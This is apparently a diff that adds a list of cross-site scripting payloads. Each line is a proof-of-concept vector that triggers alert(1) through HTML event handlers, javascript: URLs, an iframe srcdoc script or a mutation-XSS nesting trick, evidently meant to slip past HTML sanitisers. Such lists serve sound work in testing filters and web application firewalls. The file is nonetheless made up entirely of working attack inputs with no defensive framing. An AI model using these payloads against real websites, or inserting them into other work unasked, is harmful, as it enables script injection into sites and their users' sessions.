@@ -1,0 +1,28 @@
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus tabindex=1>
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+<video src=x onloadstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1) value=2 min=0 max=10>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<isindex onfocus=alert(1) autofocus>
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)>
+<body onfocus=alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img title="-->&lt;img src=x onerror=alert(1)&gt;">
+<input type=image src=x onerror=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href=javascript:alert(1)>click</a>
+<div onpointerover=alert(1)>hover</div>
+<div onpointerenter=alert(1)>hover</div>
+<div ontouchstart=alert(1)>touch</div>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<x onfocus=alert(1) id=x tabindex=1>#x</x>
